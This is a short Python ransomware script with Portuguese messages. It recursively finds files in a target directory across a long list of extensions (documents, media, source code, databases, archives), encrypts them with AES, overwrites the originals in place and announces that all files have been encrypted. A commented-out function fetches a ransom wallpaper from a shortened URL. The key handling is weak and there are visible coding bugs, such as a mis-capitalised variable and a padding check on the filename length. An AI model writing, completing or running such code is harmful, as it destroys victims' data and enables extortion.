from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from random import randint
from time import sleep
from colorama import Fore, Back, Style
import os, base64, json

path = os.path.abspath("<INSERIR DIRETORIO AQUI>")

# def set_wallpaper():
#     os.chdir(path)
#     response = requests.get("https://bit.ly/2YBfkLl")
#     file = open(os.getcwd()+'\\you_has_been_encrypted.png', 'wb')
#     file.write(response.content)
#     file.close()
#     #ctypes.windll.user32.SystemParametersInfoW(20, 0, os.getcwd()+'\\you_has_been_encrypted.png', 0)

def jsonFile():
    json_data = {
    'key': x_key,
    'iv': y_iv,
}
    with open(path + '\\key_iv.json', 'w') as jsonFile:
        json.dump(json_data, jsonFile)
        jsonFile.close()

def discoverFiles(startpath):
    extensions = [
            # 'exe,', 'dll', 'so', 'rpm', 'deb', 'vmlinuz', 'img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
            'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd', 'raw', # images
            'mp3','mp4', 'm4a', 'aac','ogg','flac', 'wav', 'wma', 'aiff', 'ape', # music and sound
            'avi', 'flv', 'm4v', 'mkv', 'mov', 'mpg', 'mpeg', 'wmv', 'swf', '3gp', # Video and movies

            'doc', 'docx', 'xls', 'xlsx', 'ppt','pptx', # Microsoft office
            'odt', 'odp', 'ods', 'txt', 'rtf', 'tex', 'pdf', 'epub', 'md', # OpenOffice, Adobe, Latex, Markdown, etc
            'yml', 'yaml', 'xml', 'csv', # structured data
            'db', 'sql', 'dbf', 'mdb', 'iso', # databases and disc images

            'html', 'htm', 'xhtml', 'php', 'asp', 'aspx', 'js', 'jsp', 'css', # web technologies
            'c', 'cpp', 'cxx', 'h', 'hpp', 'hxx', # C source code
            'java', 'class', 'jar', # java source code
            'ps', 'bat', 'vb', # windows based scripts
            'awk', 'sh', 'cgi', 'pl', 'ada', 'swift', # linux/mac based scripts
            'go', 'py', 'pyc', 'bf', 'coffee', # other source code files

            'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'bak',  # compressed formats

            'wasted', 'eslock' # ransomware extension
        ]

    for root, directories, files in os.walk(startpath):
        for name in files:
            absolute_path = os.path.abspath(os.path.join(root, name))
            ext = absolute_path.split('.')[-1]
            if ext in extensions:
                yield absolute_path

if __name__ == "__main__":
    x = discoverFiles(path)

    x_key = str(randint(1111111111111111, 9999999999999999))
    key = bytes(x_key, encoding='utf8')
    # print("Key: %s"%x_key)

    y_iv = str(randint(1111111111111111, 9999999999999999))
    iv = bytes(y_iv, encoding='utf8')
    # print("Iv: %s"%y_iv)

    jsonFile()

    for i in x:
        sleep(randint(1,2))
        with open(f'{i}', 'r+b') as read_file:
            byte_read = read_file.read()
            print("Criptografando o arquivo...")
            print(f'Arquivo {Fore.RED + i + Style.RESET_ALL} criptografado com sucesso!')
            # print(len(byte_read)+' bytes')
            encryption_suite = AES.new(key, AES.MODE_CFB, iv)
            if len(i) % AES.block_size != 0:
                cipher_text = encryption_suite.encrypt(pad(byte_read, 128))                
            else:
                Cipher_text = encryption_suite.encrypt(byte_read)    
            enc = base64.b64encode(cipher_text)
            file = open(f"{i}", "wb")
            file.write(enc)
            file.close()
    # set_wallpaper()
    print(Fore.RED + 'TODOS OS SEUS ARQUIVOS FORAM CRIPTOGRAFADOS' + Style.RESET_ALL)